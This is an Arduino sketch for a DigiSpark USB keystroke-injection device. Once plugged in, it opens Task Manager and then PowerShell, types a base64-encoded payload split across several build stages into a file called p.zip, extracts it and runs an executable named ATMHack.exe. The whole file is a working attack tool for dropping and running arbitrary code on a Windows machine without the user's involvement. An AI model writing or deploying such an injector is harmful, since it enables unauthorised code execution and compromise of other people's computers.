#include "DigiKeyboard.h"
#include "./payload.h"

#define STAGE 0

#define ZIP_NAME "p.zip"
#define EXE_NAME ".\\p\\ATMHack.exe"

#define KEY_ARROW_DOWN 0x51
#define KEY_DELETE 0x4C

#define SLEEP(seconds) DigiKeyboard.delay(seconds)
#define PRINT(message) DigiKeyboard.print(message)
#define PRINTLN(message) DigiKeyboard.println(message)

void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
}

void loop() {
  SLEEP(500);

#if STAGE == 0
  DigiKeyboard.sendKeyStroke(KEY_DELETE, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  SLEEP(1000);

  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 0);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);

  SLEEP(1000);

  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);

  SLEEP(1000);

  PRINTLN("powershell");

  SLEEP(2000);

  PRINTLN("cd $HOME");

  PRINT("[IO.File]::WriteAllBytes(\"$HOME\\\\");
  PRINT(ZIP_NAME);
  PRINT("\",[Convert]::FromBase64String(\"");
  PRINT(PAYLOAD0);
  PRINT(PAYLOAD1);
#elif STAGE == 1
  PRINT(PAYLOAD2);
  PRINT(PAYLOAD3);
#elif STAGE == 2
  PRINT(PAYLOAD4);
  PRINT(PAYLOAD5);
#elif STAGE == 3
  PRINT(PAYLOAD6);
  PRINT(PAYLOAD7);
#elif STAGE == 4
  PRINT(PAYLOAD8);
  PRINT(PAYLOAD9);

  PRINT("\"))");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  SLEEP(1000);

  PRINTLN("Expand-Archive \"" ZIP_NAME "\"");

  SLEEP(1000);

  PRINTLN(EXE_NAME);
#endif

  digitalWrite(1, LOW);

  SLEEP(60000);
}
